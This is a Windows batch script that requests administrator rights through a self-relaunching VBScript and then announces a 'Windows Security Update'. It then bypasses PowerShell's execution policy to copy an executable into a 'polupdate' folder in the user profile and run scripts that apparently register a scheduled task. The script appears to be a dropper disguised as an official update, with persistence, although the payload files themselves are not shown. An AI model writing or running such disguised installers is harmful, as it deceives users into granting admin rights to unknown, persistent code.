@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
:--------------------------------------

powershell -c "write-host '[info] Starting Windows Security Update...'"
powershell -ep Bypass -c "[void](New-Item -Path $($env:userprofile+'\polupdate') -ItemType Directory -Force)"
powershell -ep Bypass -c "Copy-Item -Force .\update\win_update_check.exe $($env:userprofile+'\polupdate')"
powershell -ep Bypass -File ".\update\add_task.ps1"
powershell -ep Bypass -File ".\update\update.ps1"